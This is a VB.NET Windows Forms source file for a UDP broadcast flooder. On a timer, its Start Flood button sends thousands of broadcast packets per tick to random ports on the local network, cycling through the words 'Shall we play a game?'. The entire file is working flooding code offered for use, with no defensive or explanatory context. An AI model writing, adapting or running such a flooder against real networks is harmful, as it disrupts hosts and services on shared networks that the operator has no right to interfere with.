

Public Class Main
    Dim intCurrentWord As Integer = 0

    Private Sub btnFlood_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnStartFlood.Click
        btnStartFlood.Enabled = False
        btnStopFlood.Enabled = True
        tmrRunner.Enabled = True
    End Sub

    Private Sub btnStopFlood_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnStopFlood.Click
        btnStartFlood.Enabled = True
        btnStopFlood.Enabled = False
        tmrRunner.Enabled = False
    End Sub

    Private Sub tmrRunner_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrRunner.Tick
        Dim objRandom As New Random()
        Dim intPort As Integer

        intPort = objRandom.Next(123, 5000)
        lblPortNumber.Text = intPort.ToString()
        Application.DoEvents()

        Select Case intCurrentWord
            Case 0
                For i = 0 To 5000
                    Dim udp As New Net.Sockets.UdpClient()
                    udp.EnableBroadcast = True
                    Dim ep As New Net.IPEndPoint(Net.IPAddress.Broadcast, intPort)
                    Dim b() As Byte = System.Text.Encoding.UTF32.GetBytes("Shall")
                    udp.Send(b, b.Length, ep)
                    udp.Close()
                Next
            Case 1
                For i = 0 To 5000
                    Dim udp As New Net.Sockets.UdpClient()
                    udp.EnableBroadcast = True
                    Dim ep As New Net.IPEndPoint(Net.IPAddress.Broadcast, intPort)
                    Dim b() As Byte = System.Text.Encoding.UTF32.GetBytes("we")
                    udp.Send(b, b.Length, ep)
                    udp.Close()
                Next
            Case 2
                For i = 0 To 5000
                    Dim udp As New Net.Sockets.UdpClient()
                    udp.EnableBroadcast = True
                    Dim ep As New Net.IPEndPoint(Net.IPAddress.Broadcast, intPort)
                    Dim b() As Byte = System.Text.Encoding.UTF32.GetBytes("play")
                    udp.Send(b, b.Length, ep)
                    udp.Close()
                Next
            Case 3
                For i = 0 To 5000
                    Dim udp As New Net.Sockets.UdpClient()
                    udp.EnableBroadcast = True
                    Dim ep As New Net.IPEndPoint(Net.IPAddress.Broadcast, intPort)
                    Dim b() As Byte = System.Text.Encoding.UTF32.GetBytes("a")
                    udp.Send(b, b.Length, ep)
                    udp.Close()
                Next
            Case 4
                For i = 0 To 5000
                    Dim udp As New Net.Sockets.UdpClient()
                    udp.EnableBroadcast = True
                    Dim ep As New Net.IPEndPoint(Net.IPAddress.Broadcast, intPort)
                    Dim b() As Byte = System.Text.Encoding.UTF32.GetBytes("game?")
                    udp.Send(b, b.Length, ep)
                    udp.Close()
                Next
        End Select
        intCurrentWord += 1
        If intCurrentWord = 5 Then
            intCurrentWord = 0
        End If
        lblPortNumber.Text = ""
    End Sub
End Class
